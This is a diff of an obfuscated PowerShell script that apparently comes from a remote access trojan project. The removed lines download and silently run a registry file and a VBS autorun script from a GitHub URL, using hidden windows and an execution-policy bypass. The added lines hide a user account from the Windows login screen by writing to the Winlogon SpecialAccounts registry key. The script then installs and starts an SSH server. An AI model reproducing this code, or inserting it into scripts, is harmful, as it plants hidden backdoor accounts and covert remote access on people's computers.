@@ -31,10 +31,12 @@ geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $HcMjDkGFes
 
 
 # registry
-powershell -c powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/registry/hideuser.reg' -OutFile 'hideuser.reg'"
-powershell -c powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/registry/auto_excutive.vbs' -OutFile 'excutive.vbs'"
-powershell.exe -windowstyle hidden -ep unrestricted ./hideuser.reg; powershell.exe -windowstyle hidden -ep unrestricted ./excutive.vbs
-
+# reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v admin
+$csfMFzvgEN = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
+$jmQikqoKMZ = '00000000'
+New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
+New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
+New-ItemProperty -Path $csfMFzvgEN -Name $sqbXFdLvyw -Value $jmQikqoKMZ -PropertyType DWORD -Force
 # ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
